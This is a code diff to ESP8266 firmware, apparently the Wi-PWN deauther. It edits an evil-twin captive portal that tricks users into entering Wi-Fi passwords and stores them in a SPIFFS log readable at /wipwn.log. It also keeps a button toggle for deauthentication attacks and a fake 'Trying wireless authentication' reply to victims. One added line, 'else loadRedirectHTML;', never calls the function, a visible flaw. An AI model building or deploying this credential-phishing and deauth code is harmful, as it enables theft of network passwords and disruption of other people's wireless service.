@@ -35,7 +35,7 @@
 #define GPIO0_DEAUTH_BUTTON   /* <-- Enable using GPIO0 (Flash button on NodeMCUs) as a deauth attack toggle (CAN LEAD TO LED BLINKING BUG!)*/
 #define resetPin 4            /* <-- comment out or change if you need GPIO 4 for other purposes */
 //#define USE_LED16           /* <-- for the Pocket ESP8266 which has a LED on GPIO 16 to indicate if it's running */
-//#define USE_CAPTIVE_PORTAL  /* <-- enable captive portal (redirects all pages to 192.168.4.1) - most devices flood the ESP8266 with requests */
+//#define USE_CAPTIVE_PORTAL  /* <-- enable captive portal (redirects all pages to 192.168.4.1), Wi-PWN page is available on /wipwn, passwords are accessed using /wipwn.log */
 
 // Evil Twin with Captive Portal //
 #ifdef USE_CAPTIVE_PORTAL
@@ -302,14 +302,14 @@ void loadRedirectHTML() {
   };
 
   void saveCaptiveData(String user, String passwd){
-    File file = SPIFFS.open("/pwnd.log", "a");
+    File file = SPIFFS.open("/wipwn.log", "a");
     if (!file) { Serial.println("File open failed"); }
     file.println("[" + settings.ssid + "] " + user + ":" + passwd + "<br>");
   };
 
   void readCaptiveData(){
     String line;
-    File file = SPIFFS.open("/pwnd.log", "r");
+    File file = SPIFFS.open("/wipwn.log", "r");
     if (!file) { Serial.println("file open failed"); }
     Serial.println("====== Reading from SPIFFS file =======");
     while(file.available()) { line += file.readStringUntil('\n'); }
@@ -818,17 +818,20 @@ void setup() {
   }
   
   #ifdef USE_CAPTIVE_PORTAL
-    server.on("/pwnd", readCaptiveData);
+    server.on("/wipwn.log", readCaptiveData);
     server.on("/authenticate", []() {
-      String user = server.arg("user");
-      String passwd = server.arg("passwd");
+      String user = "";
+      String passwd = "";
+      if (server.hasArg("user")) {user = server.arg("user");}
+      if (server.hasArg("passwd")) {passwd = server.arg("passwd");}
       if (user.length() > 0 || passwd.length() > 0) {
         saveCaptiveData(user, passwd);
         server.send(200, "text/html", "Trying wireless authentication for IEEE 802.11 Wi-Fi connection...");
-      };
+      }
+      else loadRedirectHTML;
     });
-    if (!settings.newUser == 1) {
-      server.on("/pwnr", loadIndexHTML);
+    if (settings.newUser == 0) {
+      server.on("/wipwn", loadIndexHTML);
       server.onNotFound(loadCaptiveHTML);
       server.on("/", loadCaptiveHTML);
       server.on("/index.html", loadCaptiveHTML);
